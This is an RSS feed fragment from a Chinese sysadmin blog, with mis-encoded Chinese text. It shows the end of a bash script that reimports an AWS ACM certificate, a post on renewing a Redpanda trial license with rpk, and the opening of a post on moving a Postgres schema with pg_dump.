&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;é”™è¯¯ï¼šè¯ä¹¦æ–‡ä»¶ &amp;#39;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;CERTIFICATE_BODY_PATH&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#39; ä¸å­˜åœ¨ã€‚&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;exit&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt; ! -f &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;PRIVATE_KEY_PATH&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;é”™è¯¯ï¼šç§é’¥æ–‡ä»¶ &amp;#39;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;PRIVATE_KEY_PATH&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#39; ä¸å­˜åœ¨ã€‚&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;exit&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt; -n &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;CERTIFICATE_CHAIN_PATH&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt; ! -f &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;CERTIFICATE_CHAIN_PATH&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;è­¦å‘Šï¼šè¯ä¹¦é“¾æ–‡ä»¶ &amp;#39;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;CERTIFICATE_CHAIN_PATH&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#39; å·²æŒ‡å®šä½†ä¸å­˜åœ¨ã€‚å°†ä¸åŒ…å«è¯ä¹¦é“¾è¿›è¡Œå¯¼å…¥ã€‚&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;CERTIFICATE_CHAIN_PATH&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™æ¸…ç©ºè·¯å¾„&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# æ„é€  AWS CLI å‘½ä»¤ã€‚AWS CLI ä¼šè‡ªåŠ¨ä½¿ç”¨å®ä¾‹è§’è‰²æä¾›çš„å‡­è¯ã€‚&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;IMPORT_CMD&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;aws acm import-certificate \
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;  --certificate-arn &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;CERTIFICATE_ARN&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; \
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;  --certificate fileb://&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;CERTIFICATE_BODY_PATH&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; \
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;  --private-key fileb://&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;PRIVATE_KEY_PATH&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; \
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;  --region \&amp;#34;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;AWS_REGION&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;\&amp;#34;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# å¦‚æœæœ‰è¯ä¹¦é“¾ï¼Œåˆ™æ·»åŠ åˆ°å‘½ä»¤ä¸­&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt; -n &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;CERTIFICATE_CHAIN_PATH&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;IMPORT_CMD&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;IMPORT_CMD&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; --certificate-chain fileb://&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;CERTIFICATE_CHAIN_PATH&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;æ­£åœ¨æ‰§è¡Œå‘½ä»¤ï¼š&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$IMPORT_CMD&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;--------------------------&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# æ‰§è¡Œå‘½ä»¤&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# æ³¨æ„ï¼šè¿™é‡Œæˆ‘ä»¬ä¸æŒ‡å®š --profile æˆ–ä»»ä½•å‡­è¯ï¼ŒAWS CLI ä¼šè‡ªåŠ¨ä½¿ç”¨å®ä¾‹IAMè§’è‰²ã€‚&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;eval&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$IMPORT_CMD&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# æ£€æŸ¥å‘½ä»¤æ‰§è¡Œç»“æœ&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$?&lt;/span&gt; -eq &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;--- è¯ä¹¦é‡æ–°å¯¼å…¥æˆåŠŸï¼---&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;ACM è¯ä¹¦ &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;CERTIFICATE_ARN&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; å·²æ›´æ–°ã€‚&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;--- è¯ä¹¦é‡æ–°å¯¼å…¥å¤±è´¥ï¼---&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;è¯·æ£€æŸ¥é”™è¯¯æ¶ˆæ¯ï¼Œç¡®ä¿ï¼š&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;1. EC2 å®ä¾‹å·²æ­£ç¡®é™„åŠ äº†å…·æœ‰ acm:ImportCertificate æƒé™çš„ IAM è§’è‰²ã€‚&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;2. è¯ä¹¦ã€ç§é’¥å’Œé“¾æ–‡ä»¶è·¯å¾„æ­£ç¡®ä¸”å¯è¯»ã€‚&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;3. è¯ä¹¦/ç§é’¥/é“¾çš„æ ¼å¼æ­£ç¡®ã€‚&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;--- è„šæœ¬æ‰§è¡Œå®Œæ¯• ---&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;çœ‹èµ·æ¥çœŸçš„æ˜¯åˆè‡­åˆé•¿ï¼ŒåºŸè¯è¿ç¯‡ã€‚æ³¨æ„ï¼šgemini ç”Ÿæˆçš„ä»£ç æœ‰é—®é¢˜ï¼Œaws acm import-certificate çš„å‚æ•°ä¸­ï¼Œè¯ä¹¦æ–‡ä»¶çš„å‰ç¼€æ˜¯fileb://ï¼Œgeminiç»™çš„æ˜¯file://ï¼Œè°ƒè¯•äº†åŠå¤©ï¼Œæœ€åå»awsçœ‹äº†æ–‡æ¡£æ‰å‘ç°ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>Redpandaåˆ°æœŸåå¦‚ä½•ç»­License</title>
      <link>https://rendoumi.com/posts/20250725_redpanda_license/</link>
      <pubDate>Fri, 25 Jul 2025 09:01:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20250725_redpanda_license/</guid>
      <description>&lt;p&gt;ä¸Šå›æˆ‘ä»¬åœ¨ &lt;a href=&#34;https://rendoumi.com/posts/20250516-redpanda/&#34;&gt;Kafkaçš„æµ‹è¯•æ›¿ä»£å“-Redpanda&lt;/a&gt; ä¸­è¯´äº†æ€ä¹ˆæ­å»ºï¼Œç»“æœç”¨äº†ä¸€ä¸ªæœˆï¼Œé—®é¢˜å°±æ¥äº†&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20250725132008481&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20250725_redpanda_license/image-20250725132008481.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;licenseè¿‡æœŸäº†ï¼Œæ“¦çš„ï¼Œåªå…è®¸ç”¨30å¤©ï¼Œéœ€è¦ç»­è´¹äº†ã€‚&lt;/p&gt;
&lt;p&gt;æ–¹æ³•å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;ä¸€ã€æ‰“å¼€ç½‘ç«™ï¼Œç”³è¯·30å¤©çš„å…è´¹license&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://cloud.redpanda.com/try-enterprise&#34;&gt;https://cloud.redpanda.com/try-enterprise&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;æ‰“å¼€ç½‘ç«™ï¼Œç„¶åå¡«å…¥å§“åå’Œé‚®ç®±ï¼Œå°±ä¼šå¾—åˆ°ä¸€ä¸ªé•¿å­—ç¬¦ä¸²xyzï¼Œæ‹·è´ä¸‹æ¥&lt;/p&gt;
&lt;p&gt;äºŒã€å»æœºå™¨ä¸Š&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬æ˜¯ç”¨docker composeå¯åŠ¨çš„ï¼Œæ‰€ä»¥éœ€è¦è¿›å…¥å®¹å™¨ï¼Œå¯¼å…¥license&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;docker &lt;span class=&#34;nb&#34;&gt;exec&lt;/span&gt; -it redpanda-0 /bin/sh
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;rpk cluster license &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; xyz
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¸‰ã€é‡å¯å®¹å™¨&lt;/p&gt;
&lt;p&gt;æŒ‰é“ç†ä¸Šä¸€æ­¥å¼„å®Œï¼Œå°±åº”è¯¥å¥½äº†çš„ï¼Œå¯æƒœè¿™äº§å“åšçš„ç¨€çƒ‚ã€‚è¿˜å¿…é¡»é‡å¯å®¹å™¨æ‰èµ·ä½œç”¨&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;docker compose restart
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å°±okäº†ï¼Œä½†æ˜¯30å¤©å°±æ›´æ–°ä¸€æ¬¡licenseï¼Œè€Œä¸”å¿…é¡»è¦é‡å¯å®¹å™¨ï¼Œè¿™è°å—å¾—äº†å•Šã€‚&lt;/p&gt;
&lt;p&gt;ä¸‹å‘¨å°±æŠ½ç©ºè£…ä¸€ä¸ªä¸ä¾èµ–Zookeeperï¼Œç”¨Rraftçš„Kafkaæ¥ç”¨ï¼Œå½»åº•å»æ‰è¿™ä¸ªä¸ä¼¦ä¸ç±»çš„è½¯ä»¶ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>Postgresä¸åŒå®ä¾‹ã€ä¸åŒç”¨æˆ·ç›´æ¥çš„æ•°æ®å¯¼å‡ºå¯¼å…¥</title>
      <link>https://rendoumi.com/posts/20250723-postgres_dump_restore/</link>
      <pubDate>Wed, 23 Jul 2025 09:01:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20250723-postgres_dump_restore/</guid>
      <description>&lt;p&gt;å…¬å¸ç”Ÿäº§ç¯å¢ƒåœ¨AWSä½¿ç”¨äº† Aurora Postgres Serveless çš„æ•°æ®åº“ã€‚&lt;/p&gt;
&lt;p&gt;æµ‹è¯•ç¯å¢ƒæ˜¯åœ¨å†…ç½‘æ­å»ºäº†ä¸€ä¸ªpostgres 13æ•°æ®åº“ã€‚&lt;/p&gt;
&lt;p&gt;é‚£æµ‹è¯•å’Œç”Ÿäº§çš„å®ä¾‹ä¸åŒï¼Œæ•°æ®åº“ä¸åŒï¼Œç”¨æˆ·åä¹Ÿä¸åŒï¼Œéœ€è¦æŠŠæµ‹è¯•ç¯å¢ƒçš„Aåº“çš„schema.publicè¿ç§»åˆ°ç”Ÿäº§Båº“çš„schema.publicã€‚&lt;/p&gt;
&lt;p&gt;æ™®åŠä¸€ä¸‹æ¦‚å¿µï¼ŒPGçš„æƒé™åˆ†ä¸‰å±‚ï¼Œæ•°æ®åº“ã€schemaã€schemaä¸­çš„å¯¹è±¡ã€‚&lt;/p&gt;
&lt;p&gt;é‚£ä¹ˆç”¨pg_dumpçš„è¯ï¼Œå¦‚æœä¸å¸¦ä»»ä½•å‚æ•°ï¼Œé‚£ä¼šæŠŠæƒé™ä¹Ÿç»™å¸¦ä¸Šï¼Œé‚£å°±éº»çƒ¦å¤§äº†å»äº†ï¼&lt;/p&gt;
&lt;p&gt;æ‰€ä»¥æ­£ç¡®çš„å¯¼å‡ºã€å¯¼å…¥æ­¥éª¤å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;ä¸€ã€é¦–å…ˆè¦è§‚å¯Ÿæºåº“ï¼Œçœ‹çœ‹éƒ½æœ‰ä»€ä¹ˆextentionï¼Œåœ¨schema.publicæœ‰ä»€ä¹ˆFunctions&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20250723135100741&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20250723-postgres_dump_restore/image-20250723135100741.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œçœ‹åˆ°&lt;code&gt;uuid_generate&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# çœ‹çœ‹æœåŠ¡å™¨ç‰ˆæœ¬&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt; version&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;PostgreSQL 13.14
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;é‚£å°±å¾ˆå¥‡æ€ªï¼Œextension åªæœ‰ä¸€ä¸ªplpgsqlï¼Œfunctionså´æœ‰ä¸€å †uuid_generate&lt;/p&gt;
&lt;p&gt;é‚£åæœ‰å…«ä¹éœ€è¦ç”¨åˆ°&lt;code&gt;extension uuid-oosp&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;å…ˆå»ç›®çš„åº“å»ºä¸€ä¸ªå§&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;create extension &lt;span class=&#34;s2&#34;&gt;&amp;#34;uuid-ossp&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;äºŒã€dumpæ•°æ®&lt;/p&gt;
&lt;p&gt;è¿™é‡Œè¦æ³¨æ„ï¼Œä¸è¦æŠŠä»»ä½•æƒé™çš„ä¸œè¥¿å¸¦è¿›æ¥&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;pg_dump -h 172.16.8.1 -U postgres -d &lt;span class=&#34;nb&#34;&gt;source&lt;/span&gt; --schema&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;public --no-owner --no-privileges --file&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;export.sql
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# å…¨å¤‡ä»½çš„å‘½ä»¤&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# export PGPASSWORD=&amp;#34;xxxxxxxx&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# pg_dump -U bbc -h localhost -p 5432 bbc &amp;gt; dc_system.sql&lt;/span&gt;
